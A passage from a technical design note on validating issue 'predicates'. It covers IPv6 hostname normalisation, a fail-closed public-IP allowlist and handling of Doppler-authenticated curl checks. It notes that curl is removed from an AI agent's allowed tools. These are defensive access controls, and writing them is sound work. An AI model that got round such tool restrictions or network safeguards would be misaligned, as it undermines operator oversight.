  `ALLOWED_PREDICATE_HOSTS.has()`. Use `hostname.replace(/^\[|\]$/g, "")`.
- The `isPublicIp()` function MUST allowlist `"unicast"` (the single public
  range) rather than denylist the ~28 non-public ranges. If ipaddr.js adds
  a new range in a future release, the denylist approach would silently
  allow the new range; the allowlist approach fails closed.
- `api-curl` predicates (3 in production corpus) require Doppler-sourced
  auth headers (`Authorization: <DOPPLER_KEY>`) and cannot be executed
  server-side without Doppler client integration. These are treated as
  `manual` -- the agent cannot verify them either since curl is removed
  from allowedTools. If an `api-curl` follow-through issue stays open past
  SLA, Guard B fires and the operator verifies manually.
- The `gh issue list` spawn in `validate-predicates` step.run uses the same
  `buildSpawnEnv()` as `ensure-labels` -- it needs `GH_TOKEN` to read issue
  bodies. The `--json` flag returns structured JSON; parse with
  `JSON.parse()` on collected stdout (same pattern as the test mock).
